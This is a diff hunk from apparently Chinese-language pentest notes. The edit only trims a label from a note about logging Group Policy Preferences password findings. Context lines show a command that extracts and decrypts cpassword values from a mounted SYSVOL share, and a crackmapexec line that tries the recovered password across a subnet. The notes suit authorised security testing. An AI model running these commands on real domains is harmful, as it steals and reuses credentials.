@@ -36,4 +36,4 @@ grep -Rho 'cpassword="[^"]*"' /mnt/sysvol | cut -d'"' -f2 | while read c; do gpp
 crackmapexec smb 192.168.1.0/24 -u user -p 'decrypted_password'
 ```
 
-小记录：GPP 命中后要记录 XML 路径、关联账号和策略名称。很多环境里密码已经轮换，仍然能暴露命名习惯和历史权限设计。
+GPP 命中后要记录 XML 路径、关联账号和策略名称。很多环境里密码已经轮换，仍然能暴露命名习惯和历史权限设计。
